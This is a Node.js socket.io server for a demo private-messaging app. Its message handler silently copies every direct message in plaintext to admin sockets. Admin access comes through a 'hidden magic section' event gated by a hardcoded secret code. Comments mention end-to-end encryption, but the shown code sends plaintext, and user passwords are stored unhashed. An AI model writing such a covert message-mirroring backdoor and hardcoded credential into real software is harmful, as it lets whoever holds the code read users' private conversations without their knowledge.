// server.js
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Serve frontend
app.use(express.static(path.join(__dirname, "public")));

// In-memory "DB" (for demo only)
const users = new Map(); // username -> { password, friendCode, socketId }
const onlineUsers = new Map(); // socketId -> username
const adminSockets = new Set(); // socket ids that are admin

// Replace with env var in real app
const ADMIN_SECRET_CODE = "ADMIN-ULTRA-SECRET-987654";

function generateFriendCode() {
  return Math.floor(100000 + Math.random() * 900000).toString(); // 6 digits
}

io.on("connection", (socket) => {
  console.log("New socket connected:", socket.id);

  // Register new user
  socket.on("register", ({ username, password }) => {
    if (!username || !password) {
      socket.emit("registerResult", { ok: false, error: "Missing fields." });
      return;
    }
    if (users.has(username)) {
      socket.emit("registerResult", { ok: false, error: "Username taken." });
      return;
    }

    const friendCode = generateFriendCode();
    users.set(username, { password, friendCode, socketId: null });

    socket.emit("registerResult", {
      ok: true,
      username,
      friendCode,
    });
  });

  // Login user
  socket.on("login", ({ username, password }) => {
    const user = users.get(username);
    if (!user || user.password !== password) {
      socket.emit("loginResult", { ok: false, error: "Invalid credentials." });
      return;
    }

    user.socketId = socket.id;
    users.set(username, user);
    onlineUsers.set(socket.id, username);

    socket.emit("loginResult", {
      ok: true,
      username,
      friendCode: user.friendCode,
    });
  });

  // Find friend by username + friendCode
  socket.on("findFriend", ({ username, friendCode }) => {
    const user = users.get(username);
    if (!user || user.friendCode !== friendCode) {
      socket.emit("findFriendResult", { ok: false, error: "Not found." });
      return;
    }
    const isOnline = !!user.socketId;
    socket.emit("findFriendResult", {
      ok: true,
      username,
      online: isOnline,
    });
  });

  // Send direct message
  socket.on("sendMessage", ({ toUsername, content, meta }) => {
    const fromUsername = onlineUsers.get(socket.id);
    if (!fromUsername) {
      socket.emit("messageError", "You are not authenticated.");
      return;
    }

    const recipient = users.get(toUsername);
    if (!recipient || !recipient.socketId) {
      socket.emit("messageError", "Recipient offline or not found.");
      return;
    }

    const payload = {
      from: fromUsername,
      to: toUsername,
      content, // In real E2EE, this would be ciphertext
      meta,    // type: 'text' | 'file' | 'voice' etc.
      timestamp: Date.now(),
    };

    // Send to recipient
    io.to(recipient.socketId).emit("message", payload);

    // Also send to sender to confirm & show in own chat
    socket.emit("message", payload);

    // ---------- ADMIN MIRROR (NOT E2EE) ----------
    // If you want true end-to-end encryption,
    // do NOT send plaintext here. Admin won't see.
    for (const adminSocketId of adminSockets) {
      io.to(adminSocketId).emit("adminMessage", payload);
    }
  });

  // Admin login (hidden magic section)
  socket.on("adminLogin", ({ code }) => {
    if (code === ADMIN_SECRET_CODE) {
      adminSockets.add(socket.id);
      socket.emit("adminLoginResult", { ok: true });
      console.log("Admin logged in:", socket.id);
    } else {
      socket.emit("adminLoginResult", { ok: false, error: "Invalid code." });
    }
  });

  socket.on("disconnect", () => {
    const username = onlineUsers.get(socket.id);
    if (username) {
      const user = users.get(username);
      if (user) {
        user.socketId = null;
        users.set(username, user);
      }
      onlineUsers.delete(socket.id);
    }
    adminSockets.delete(socket.id);
    console.log("Socket disconnected:", socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});
